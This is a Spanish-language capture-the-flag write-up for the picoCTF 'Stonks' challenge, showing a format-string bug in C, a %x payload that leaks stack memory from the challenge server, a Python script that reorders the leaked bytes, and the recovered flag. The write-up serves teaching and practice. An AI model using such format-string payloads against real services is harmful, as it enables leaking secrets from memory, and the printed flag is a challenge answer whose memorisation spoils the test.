# Reto


## Descripcion
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) `nc mercury.picoctf.net 59616`
## Pistas
Okay, maybe I'd believe you if you find my API key.

## Solucion
hacemos cat al codigo y nos encontramos con lo siguiente
```c
char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);
```
nos damos cuenta que similar al problema anterior podemos obtener informacion de memoria gracias al formateo de string
asi que al ejecutar el programa le pasamos lo siguiente 
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
y obtenemos como resultado esto
```hex
885f370804b00080489c3f7f61d80ffffffff1885d160f7f6f110f7f61dc70885e1801da885f350885f3706f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ff93007df7f9caf8f7f6f4408177d70010f7dfece9f7f700c0f7f615c0f7f61000ff939b48f7def68df7f615c08048ecaff939b540f7f83f09804b000f7f61000f7f61e20ff939b88f7f89d50f7f628908177d700f7f61000804b000ff939b888048c86885d160ff939b74ff939b888048be9f7f613fc0ff939c3cff939c3411885d1608177d700ff939ba000f7da4fa1f7f61000f7f610000f7da4fa11ff939c34ff939c3cff939bc410f7f61000f7f8470af7f9c0000f7f610000078ea6109eb43e719000180486300f7f89d50f7f84960804b00018048630080486628048b851ff939c348048cd08048d30f7f84960ff939c2cf7f9c9401ff93ae7a0ff93aeb3ff93aec0ff93aec9ff93aef8ff93af30ff93af4bff93af6bff93af73020f7f74b5021f7f74000101f8bfbff61000116438048034420597f7f750008098048630b410c
```
lo pasamos en un traductor hex a ascii
```
_7°H?aØÿÿÿñ]oaÜp^Ú_5ópocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿ}÷ùÊø÷öô@w×÷ßìé÷÷À÷öÀ÷öÿH÷Þö÷öÀHì¯ù9µ@÷ø?	Kaaâù9¸Õb}pa°ÿHÈhÑ`ÿtÿH¾a?Àÿ<ÿ4]}pù9º}¤úaa÷ÚO¡ù9ÃOù9ÃÏù9¼Aap¯÷öxêa	ëCçHc÷øP÷øI`KHcHf(ù9ÃHÐHÓù9ÂÏÿ®zù:ë?ù:ìù:ìù:ïù:óù:ô¿ù:ö¿ù:÷0 ÷÷KP!÷÷@ûÿaCHD Yu	HcA
```
y creamos un script python que arregle los caracteres del texto que tiene formato de bandera (despues de eliminar caracteres especiales dentro de ella)
la logica esta en separar el texto en bloques cada 4 cracteres y si ese bloque esta completo invierte sus caracteres
```python
def separar_en_bloques(string):

    bloques = []

    for i in range(0, len(string), 4):

        bloque = string[i:i+4]

        if len(bloque) == 4:

            bloque_invertido = bloque[::-1]

        else:

            bloque_invertido = bloque

        bloques.append(bloque_invertido)

    cadena_modificada = "".join(bloques)

    return cadena_modificada

  

# cadena a descifrar

cadena = "ocip{FTC0l_I4_t5m_ll0m_y_y3n841645eb}"

resultado = separar_en_bloques(cadena)

print(resultado)
```
## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
## Notas adicionales


## Referencias
